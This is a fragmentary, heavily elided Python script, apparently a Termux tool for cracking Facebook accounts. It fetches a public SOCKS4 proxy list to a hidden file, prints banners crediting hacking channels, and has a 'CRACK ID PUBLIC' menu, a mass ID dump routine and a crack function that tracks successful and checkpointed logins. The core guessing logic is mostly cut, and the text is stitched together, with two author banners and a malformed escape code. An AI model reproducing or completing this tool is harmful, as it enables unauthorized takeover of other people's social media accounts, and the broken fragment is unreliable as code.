...
try:
	...
	prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text	open('.prox.txt','w').write(prox)
...
{P}                                        
   ...
   d'    YM.       MM      MM        MM     
  ,MMMMMMMMb       MM      MM        MM     
  d'      YM. 68b  MM      MM 68b    MM     
_dM_     _dMM_Y89 _MM_    _MM_Y89   _MM_                                            
=================================================

{P} [{H}■{P}] Author    : Sayed Qasim Nasimi

{P} [{H}■{P}] TELEGRAM  : @King_Tech_001

{P} [{H}■{P}] CHANNEL :   AFG HACK TEAM

=================================================

{M}>{K}>{H}> {P}CRACKING FACEBOOK {H}>{K}>{M}>
...
def menu(my_name,my_id):
	...
	print(' \033[1;97m[\033[1;32m01\033[1;97m] CRACK ID PUBLIC')
	...
	_____alvino__adijaya_____ = input('033[32m ENTER =   ')
...
def dump_massal():
	...
	try:
		...
		jum = int(input('\x1b[1;91mCHAN IDET AWET (MAX20) =  '))
...
\033[1;97m [\033[1;32m■\033[1;97m] Author    : ⁶⁹ ʷʰʸARO𓆩𓆪⁶³🏴

\033[1;97m [\033[1;32m■\033[1;97m] MY    : @e_8dt

\033[1;97m [\033[1;32m■\033[1;97m] CHANAL : TERMUX-SCRIPTS
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{Z}[ARO]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]—[{K}{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]  "),
